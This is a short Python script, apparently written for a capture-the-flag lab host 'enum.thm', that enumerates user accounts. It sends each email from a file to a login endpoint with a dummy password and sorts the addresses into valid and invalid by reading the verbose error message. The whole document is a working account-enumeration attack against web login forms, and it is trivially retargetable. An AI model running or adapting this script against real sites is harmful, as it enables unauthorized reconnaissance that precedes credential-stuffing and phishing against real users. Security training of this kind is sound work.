# usage python3 script_name.py email_file

import sys
import requests

def check_email(email):

    # after adding <ip-address> to hosts file.

    url = 'http://enum.thm/labs/verbose_login/functions.php'
    headers = {
        'Host': 'enum.thm',
        'User-Agent': 'Mozilla/5.0 (X11; Linux aarch64; rv:102.0) Gecko/20100101 Firefox/102.0',
        'Accept': 'application/json, text/javascript, */*; q=0.01',
        'Accept-Language': 'en-US,en;q=0.5',
        'Accept-Encoding': 'gzip, deflate',
        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'X-Requested-With': 'XMLHttpRequest',
        'Origin': 'http://enum.thm',
        'Connection': 'close',
        'Referer': 'http://enum.thm/labs/verbose_login/',
    }

    data = {
        'username': email,
        'password': 'password', # use a random password to check if the email exists
        'function': 'login'
    }

    response = requests.post(url, headers=headers, data=data)
    return response.json()

def enumerate_emails(email_file):
    valid_emails = []
    invalid_error = 'Email does not exist'

    with open(email_file, 'r') as file:
        emails = file.readlines()

    for email in emails:
        email = email.strip()
        if email:
            response_json = check_email(email)
            if response_json['status'] == 'error' and invalid_error in response_json['message']:
                print(f"[INVALID] {email}")

            else:
                print(f"[VALID] {email}")
                valid_emails.append(email) 
    return valid_emails

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("Usage: python Authentication_Enumeration.py <email_file>")
        sys.exit(1)

    email_file = sys.argv[1]
    valid_emails = enumerate_emails(email_file)

    print("\nValid Emails found:")
    for email in valid_emails:
        print(email)
